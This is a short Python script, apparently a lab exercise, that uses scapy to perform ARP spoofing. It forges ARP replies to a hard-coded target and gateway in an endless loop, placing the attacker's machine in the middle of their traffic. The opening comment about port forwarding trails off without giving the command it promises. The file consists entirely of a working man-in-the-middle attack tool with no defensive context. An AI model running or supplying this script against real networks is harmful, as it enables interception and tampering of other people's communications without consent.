# To be able to be Man in the middle, we need to allow data to flow through our system with port forwarding.
# use command:
import scapy.all as scapy
import argparse
import time
import sys

def get_mac(ip_addr):  # finds the MAC addr of the target computer
    arp_request = scapy.ARP(pdst=ip_addr)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answer_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answer_list[0][1].hwsrc  # return the mac addr.


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # op flag: 1 = arp request, 2 = arp response
    # hwdst is the MAC addr of the target

    scapy.send(packet, verbose=False)


def main(target_ip, spoof_ip):  # executes man-in-the-middle
    packet_counter = 0
    try:
        while True:
            spoof(target_ip, spoof_ip)
            spoof(spoof_ip, target_ip)
            packet_counter += 2
            print("\r[+] Packets sent: " + str(packet_counter)),
            sys.stdout.flush()
            # print("\r[+] Packets sent: " + str(packet_counter), end="") PYTHON 3 version
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[+] Detected CTRL + C. Quitting.")

main("10.0.2.15", "10.0.2.1")